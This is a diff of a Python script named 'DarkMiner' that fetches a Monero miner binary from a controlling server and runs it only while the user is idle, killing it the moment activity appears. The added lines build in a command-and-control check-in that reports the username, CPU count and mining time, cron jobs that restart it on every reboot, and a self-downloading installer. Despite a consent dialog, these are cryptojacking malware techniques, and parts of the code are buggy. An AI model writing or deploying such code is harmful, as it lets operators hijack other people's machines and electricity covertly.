@@ -1,28 +1,48 @@
-# Version 1 12/28/19 (start date)
-# Vary basic rewrite of c++ code that spawns and kills miners when activity is detected
-# Works on Linux & Windows 64bit operating systems
-# Does not set anything into registry to start the program on start
-# Does not connect to a command and control server
-# Does not do a lot of things but it works as basic start
+# Version 1 2/11/21
+# All the new stuff mainly work on Linux it has not been test on windows at all
+# Sets cron jobs for autostarting on linux
+# Installer works on Linux
+# Talks to a server
 
 import sys
 import platform
+import signal
 import os
 import time
 import subprocess
+import configparser
+import multiprocessing
+import easygui
 
-waitTime = 5
-WinPathDownloads = 'C:/Users/' + os.getlogin() + '/Downloads/'
-LinuxPathDownloads = '/tmp/DarkMiner/'
-BaseSite = 'https://localhost.com/DarkMiner/'
+#Website you are hosting the controlling server on
+BaseSite = 'http://localhost/DarkMiner/'
+
+
+
+#functions
+def UpdateTotalMiningTime(value):
+    config.read('config.ini')
+    TotalTimeMining = config['value']['TotalTimeMining']
+    NewTotalTimeMining = int(TotalTimeMining) + int(value)
+    config['value'] = {
+        'TotalTimeMining' : NewTotalTimeMining
+    }
+    with open('config.ini', 'w+') as configfile:
+        config.write(configfile)
 
 
 def CommandAndControl():
     import requests
-    URL = BaseSite + 'blog.php'
-    PARAMS = {'name': location}
+    URL = BaseSite + 'coms.php'
+    config.read('config.ini')
+    TotalTimeMining = config['value']['TotalTimeMining']
+    PARAMS = {'name': os.environ['USER'], 'CPU': multiprocessing.cpu_count(),'Mining':2,'MiningTotalTime':TotalTimeMining,'version': Version}
     r = requests.get(url=URL, params=PARAMS)
     data = r.json()
+    #Here we should get back the server version
+    #Create a downloader for an update and be squared away
+
+    print(data)
 
 
 def LinuxIdleTime():
@@ -119,48 +139,137 @@ def Miner():
             if os.path.exists(LinuxPathDownloads + 'xmrigcg'):
                 print('exists no need to download')
             else:
-                DownloadData(BaseSite + 'Linux/' + 'xmrigcg', LinuxPathDownloads + 'xmrigcg')
+                DownloadData(BaseSite + 'Linux/' + 'xmrMiner', LinuxPathDownloads + 'xmrigcg')
             if os.path.exists(LinuxPathDownloads + 'config.json'):
                 print('exists no need to download')
             else:
                 DownloadData(BaseSite + 'Linux/' + 'config.json', LinuxPathDownloads + 'config.json')
             from idle_time import IdleMonitor
             monitor = IdleMonitor.get_monitor()
-            os.chmod(LinuxPathDownloads, 0o777)
-            proc = subprocess.Popen([LinuxPathDownloads + "xmrigcg"])
+            os.chmod(LinuxPathDownloads+"xmrigcg", 0o777)
+            print(LinuxPathDownloads)
+            proc = subprocess.Popen([LinuxPathDownloads + "xmrigcg"], stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
+            TotalSleepTime = 0
             while True:
                 IdleTimeSet = monitor.get_idle_time()
                 if waitTime <= IdleTimeSet:
                     print('No activity')
                     time.sleep(3)
+                    TotalSleepTime += IdleTimeSet
                 else:
                     print('Activity! Eject!')
-                    proc.terminate()  # Terminates Child Process
+                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)  # Send the signal to all the process groups
+                    #log Total Time active
+                    UpdateTotalMiningTime(TotalSleepTime)
+                    TotalSleepTime = 0
                     break
             main()
 
+def Install():
+    if easygui.ynbox('Procced with the install of DarkMiner. A tool used for mining cryptocurrency. If you do not know what this is press NO', 'Title', ('Yes', 'No')):
+        if easygui.ynbox('Would you like this to reboot on each startup of the computer', 'Title', ('Yes', 'No')):
+            rebootStart = 1
+        else:
+            rebootStart = 0
+        #writting to config
+        config['settings'] = {
+            "Agree" : 1,
+            "rebootStart" : rebootStart,
+            "waitTime" : '120',
+            "WinPathDownloads" : 'C:/Users/' + os.getlogin() + '/Downloads/',
+            "LinuxPathDownloads" : os.path.expanduser('~') +'/bin/DarkMiner/',
+        }
+        config['server'] = {
+            "Version" : 1,
+            'BaseSite' : BaseSite
+        }
+        config['value'] = {
+            'TotalTimeMining' : 0
+        }
+        with open('config.ini', 'w') as configfile:
+            config.write(configfile)
+        TotalTimeMining = 0
+        
+    
+    if(rebootStart):
+        #Set path to bin and create a folder in it
+        UserPath = os.path.expanduser('~') +'/bin/DarkMiner/'
+        FileName = sys.argv[0]
+        if not os.path.isdir(UserPath):
+            os.mkdir(UserPath,0o755)
+        #Download our script to that path
+        DownloadData(BaseSite + '/Linux/'+'main', UserPath + FileName)
+        #set cron tab linking to that site
+        from crontab import CronTab
+        cron = CronTab(user=True)
+        #Check if cronjob already exists
+        basic_iter = cron.find_command("DarkMiner")
+        exist=False
+        for item in basic_iter:
+            print("crontab job already exist")
+            exist=True
+            break
+        if not exist:
+            job = cron.new(command='python3 '+UserPath+FileName,comment='DarkMiner')
+            job.every_reboot()
+            cron.write()
+    #Copy config.ini file to working directory
+    from shutil import copyfile
+    copyfile("config.ini", UserPath+"config.ini")
+    #Start file from working directory
+    easygui.msgbox('Installed DarkMiner in '+UserPath+ " starting program", 'All done')
+    os.system("nohup python3 "+UserPath+"main.py"+" &")
+
+
 
 def main():
-    print('Starting DarkMiner on ' + osSystem)
-    if is_64bits:
-        print('64bit Machine');
+    #print('Starting DarkMiner on ' + osSystem)
+    #Contact server
+    CommandAndControl()
+    #check machine type to send to proper idle
     if osSystem == 'win32':
         WindowsIdleTime()
     elif osSystem == 'Linux':
         LinuxIdleTime()
+    #Run miner if idle is complete
     Miner()
 
+#Read from Config file if exists
+config = configparser.ConfigParser()
+if os.path.isfile('config.ini'):
+    config.read('config.ini')
+    #Settings
+    Agree = int(config['settings']['Agree'])
+    rebootStart = int(config['settings']['rebootStart'])
+    waitTime = int(config['settings']['waitTime'])
+    WinPathDownloads = config['settings']['WinPathDownloads']
+    LinuxPathDownloads = config['settings']['LinuxPathDownloads']
 
+    #Server
+    BaseSite = config['server']['BaseSite']
+    Version = config['server']['Version']
+
+    #Values
+    TotalTimeMining = config['value']['totaltimemining']
+else:
+    Agree = 0
+
+
+
+#Start of program Determans what operating system to go with
 if sys.platform.startswith('win32'):
     osSystem = 'win32'
     os32Bit = GetProgramFiles32()
-    main()
+    #Check if User has agreed to mine
+    if(Agree):
+        main()
+    else:
+        Install()
+
 elif sys.platform.startswith('linux'):
     osSystem = 'Linux'
     is_64bits = sys.maxsize > 2 ** 32
-    main()
-
-# Mainly for getting machine information
-# print(osSystem)
-# print(os32Bit)
-# print(processor)
+    if(Agree):
+        main()
+    else:
+        Install()
